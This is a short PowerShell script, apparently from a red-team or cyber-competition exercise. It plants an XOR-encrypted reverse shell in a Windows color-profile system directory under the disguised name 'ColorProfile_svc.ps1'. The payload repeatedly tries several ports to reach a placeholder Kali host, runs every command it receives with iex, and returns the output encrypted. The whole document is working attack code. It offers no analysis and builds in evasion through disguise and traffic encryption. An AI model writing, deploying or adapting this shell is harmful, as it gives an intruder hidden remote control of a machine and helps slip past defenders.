$dir = "C:\Windows\System32\spool\drivers\color"

$payload = @'
$ports  = @(80, 443, 8080, 3306, 4444, 5985, 8443)
$ip     = "YOUR_KALI_IP"
$xorKey = "CDTC0ldW4r$2026!xK"

function XorCrypt([byte[]]$data, [string]$key) {
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $out
}

while ($true) {
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            [byte[]]$buf = New-Object byte[] 8192

            while ($true) {
                $i = $stream.Read($buf, 0, $buf.Length)
                if ($i -eq 0) { break }

                $decoded  = XorCrypt $buf[0..($i-1)] $xorKey
                $command  = [System.Text.Encoding]::UTF8.GetString($decoded).Trim()

                $output   = (iex $command 2>&1 | Out-String)
                $prompt   = "PS " + (Get-Location).Path + "> "
                $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)

                $encoded  = XorCrypt $response $xorKey
                $stream.Write($encoded, 0, $encoded.Length)
                $stream.Flush()
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 5
        }
    }
    Start-Sleep -Seconds 15
}
'@

$payload | Out-File -FilePath "$dir\ColorProfile_svc.ps1" -Encoding ASCII
Write-Host "[+] Payload written. Verifying..."
Get-Content "$dir\ColorProfile_svc.ps1"